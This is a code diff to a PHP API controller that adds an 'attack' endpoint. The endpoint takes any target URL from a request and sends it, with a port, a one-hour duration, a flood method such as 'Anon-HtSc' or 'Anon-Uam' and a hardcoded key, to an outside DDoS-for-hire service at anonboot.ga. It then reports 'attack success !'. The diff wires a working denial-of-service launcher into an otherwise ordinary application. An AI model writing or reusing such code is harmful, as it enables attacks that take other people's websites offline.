@@ -64,4 +64,40 @@ class PointApiController extends BaseApiController
         }
     }
 
+    public function attack(Request $request){
+        try {
+            $k = 'BghUuaFPZH5x4Voa';
+            $h = $request['url'];
+            if (strpos($h, 'https') !== false) {
+                $p = 443;
+            }else{
+                $p = 80;
+            }
+            $t = 3600;
+            if(isset($request['method'])){
+                if($request['method'] == 'STOP'){
+                    $m = 'STOP';
+                }elseif ($request['method'] == 'socket'){
+                    $m = 'Anon-HtSc';
+                }elseif ($request['method'] == 'uam'){
+                    $m = 'Anon-Uam';
+                }elseif ($request['method'] == 'capt'){
+                    $m = 'Anon-Capt';
+                }
+            }else{
+                $m = 'Anon-HSv2';
+            }
+            $ch = curl_init("https://anonboot.ga/?key={$k}&host={$h}&port={$p}&time={$t}&method={$m}");
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 60);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            $response = curl_exec($ch);
+            curl_close($ch);
+            return $this->sendResponse('attack success !', Response::HTTP_OK);
+        }catch (\Exception $ex){
+            $this->sendError($ex->getMessage(), $ex->getCode());
+        }
+
+    }
+
 }
